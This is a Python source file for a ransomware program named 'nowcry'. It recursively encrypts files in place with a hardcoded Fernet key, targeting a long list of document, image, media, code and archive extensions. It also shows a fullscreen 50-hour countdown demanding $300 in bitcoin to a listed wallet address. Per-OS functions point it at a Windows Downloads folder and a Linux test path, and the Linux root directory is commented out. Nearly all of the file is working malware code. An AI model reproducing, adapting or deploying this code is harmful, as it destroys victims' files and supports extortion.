import platform 
##import encypting_files as encypt
##import decypt_files as decypt
import tkinter as tk
from datetime import timedelta
from cryptography.fernet import Fernet
import os
import threading

TOTAL_SECONDS = 50 * 60 * 60  # 50 hours

class Countdown:
    def __init__(self, root):
        self.root = root
        self.root.title("nowcry :/")
        self.root.attributes("-fullscreen", True)
        self.root.configure(bg="black")

        self.remaining = TOTAL_SECONDS

        self.title = tk.Label(
            root,
            text="Ooops,your files have been encytped !, nowcry :/",
            font=("Arial", 42, "bold"),
            fg="white",
            bg="black"
        )
        self.title.pack(pady=40)

        self.timer = tk.Label(
            root,
            font=("Consolas", 80, "bold"),
            fg="red",
            bg="black"
        )
        self.timer.pack(expand=True)

        self.info = tk.Label(
            root,
            text="send 300$ worth of bitcoin to this address : bc1qmyxyzcrmvgzhl7l7a87dcs2ddpxsr48rzdzw8n",
            font=("Arial", 20),
            fg="blue",
            bg="black"
        )
        self.info.pack(pady=30)


        self.update()

    def update(self):
        td = timedelta(seconds=self.remaining)
        total = int(td.total_seconds())

        hours = total // 3600
        minutes = (total % 3600) // 60
        seconds = total % 60

        self.timer.config(text=f"{hours:02}:{minutes:02}:{seconds:02}")

        if self.remaining > 0:
            self.remaining -= 1
            self.root.after(1000, self.update)


# key = Fernet.generate_key()
key = b'N8jnr5qAggtybY4D-GJH8rqQ4H9WRXy8MUXNw8d0Q50='
def encrypt_directory(target_dir):
    fernet = Fernet(key)
    target_extensions = ('.txt','.bmp','pdf','.png','.jpg','.jpeg','.webp','.gif','.avif','.apng','.jfif','.jpe','.tiff','.tif','.bmp','.heic','.heif','.svg','.eps','.ai','.wmf','.emf','.psd','.pdf','.indd','.raw','.cr2','.nef','.dng','.arw','c', 'cpp', 'cc', 'h', 'hpp', 'py', 'java', 'js', 'ts', 'jsx', 'tsx', 'html', 'css', 'rb', 'pl', 'pm', 'php', 'sh', 'bat', 'cmd', 'ps1', 'go', 'rs', 'kt', 'kts', 'swift', 'cs', 'vb', 'sql', 'r', 'm', 'scala', 'groovy', 'dart', 'lua', 'asm', 's', 'json', 'xml', 'yaml', 'yml', 'toml', 'ini', 'csv', 'tsv', 'properties', 'env', 'txt', 'md', 'rtf', 'pdf', 'docx', 'doc', 'odt', 'pages', 'tex', 'log', 'png', 'jpg', 'jpeg', 'webp', 'gif', 'svg', 'bmp', 'tiff', 'tif', 'heic', 'ico', 'psd', 'ai', 'eps', 'mp3', 'wav', 'aac', 'flac', 'ogg', 'm4a', 'wma', 'mid', 'midi', 'mp4', 'mkv', 'avi', 'mov', 'wmv', 'flv', 'webm', 'mpeg', 'mpg', '3gp', 'zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'xz', 'iso', 'exe', 'msi', 'bin', 'dmg', 'app', 'deb', 'rpm', 'apk', 'sys', 'dll', 'xlsx', 'xls', 'ods', 'pptx', 'ppt', 'odp' )

    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if file.lower().endswith(target_extensions):
                file_path = os.path.join(root, file)

                try:
                    with open(file_path, "rb") as f:
                        file_data = f.read()

                    encrypted_data = fernet.encrypt(file_data)

                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                           
                    print(file_path, "encrypted successfully")

                except Exception as e:
                    print("Failed to encrypt", file_path, "-", e)

#print(key)



def Windows():
  encrypt_directory("C:/Downloads")
  pass

def Linux():
    #encrypt_directory("/")
     encrypt_directory("/home/mohamed/malware/test") ## just for testing
     pass

def macos():
    pass


current_os = platform.system()
def picking_os():
 if current_os == "Windows":
    Windows()

 elif current_os == "Linux":
    Linux()

 elif current_os == "Darwin":
  macos()
 else :
    print("you're save now ")
    exit()



if __name__ == "__main__":
     root = tk.Tk()
     Countdown(root)
     thread = threading.Thread(target=picking_os)
     thread.start()
     root.mainloop()
     thread.join()
